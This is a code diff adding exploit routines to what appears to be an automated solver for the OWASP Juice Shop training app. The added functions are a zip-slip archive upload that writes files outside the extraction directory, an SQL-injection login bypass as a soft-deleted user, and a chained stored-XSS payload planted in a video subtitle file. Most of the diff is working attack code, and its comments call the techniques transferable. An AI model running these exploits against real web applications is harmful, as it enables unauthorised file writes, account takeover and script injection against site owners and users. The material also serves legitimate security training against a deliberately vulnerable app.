@@ -621,6 +621,53 @@ def _local_file_read(c):
             pass
 
 
+def _arbitrary_file_write(c):
+    """Zip-slip: an archive entry whose path traverses out of the extraction dir writes to ftp/legal.md
+    (CWE-22, archive-extraction path traversal). A real, transferable technique."""
+    import io
+    import zipfile
+    for depth in range(1, 9):
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as z:
+            z.writestr("../" * depth + "ftp/legal.md", "pwned-by-apolaki\n")
+        try:
+            c.post("/file-upload", files={"file": ("slip.zip", buf.getvalue(), "application/zip")})
+        except Exception:
+            pass
+
+
+def _ghost_login(c):
+    """Log in as a SOFT-DELETED user (GDPR "erasure" only marks deletedAt; the login path never filters
+    it) via SQLi email + comment. A real broken-authentication / soft-delete technique."""
+    for email in ("chris@juice-sh.op'--", "chris.pike@juice-sh.op'--"):
+        try:
+            c.post("/rest/user/login", json={"email": email, "password": "x"})
+        except Exception:
+            pass
+
+
+def _video_xss(c):
+    """Stored XSS chained through the zip-slip file write: overwrite the promo-video subtitle file with
+    an XSS payload, then hit the video handler which renders it into the page."""
+    import io
+    import zipfile
+    sub = "frontend/dist/frontend/assets/public/videos/owasp_promo.vtt"
+    vtt = "WEBVTT\n\n1\n00:00:00.000 --> 00:00:05.000\n</script><script>alert(`xss`)</script>\n"
+    for depth in range(1, 9):
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as z:
+            z.writestr("../" * depth + sub, vtt)
+        try:
+            c.post("/file-upload", files={"file": ("s.zip", buf.getvalue(), "application/zip")})
+        except Exception:
+            pass
+    for p in ("/video", "/promotion"):
+        try:
+            c.get(p)
+        except Exception:
+            pass
+
+
 _BROWSER_SOLVE_JS = r"""
 export default async function ({ page }) {
   const base = %TARGET_JSON%;
@@ -670,7 +717,8 @@ def solve(base_url: str) -> dict:
                      _multiple_likes, _reflected_and_nosql, _api_and_header_xss, _serverside_xss,
                      _allowlist_bypass, _privacy_and_jwt, _imaginary,
                      _product_tampering, _password_hash_leak, _expired_coupon,
-                     _ftp_harvest, _sqli_union_extract, _view_basket, _unsigned_jwt, _local_file_read):
+                     _ftp_harvest, _sqli_union_extract, _view_basket, _unsigned_jwt, _local_file_read,
+                     _arbitrary_file_write, _ghost_login, _video_xss):
             try:
                 step(c)
             except Exception:
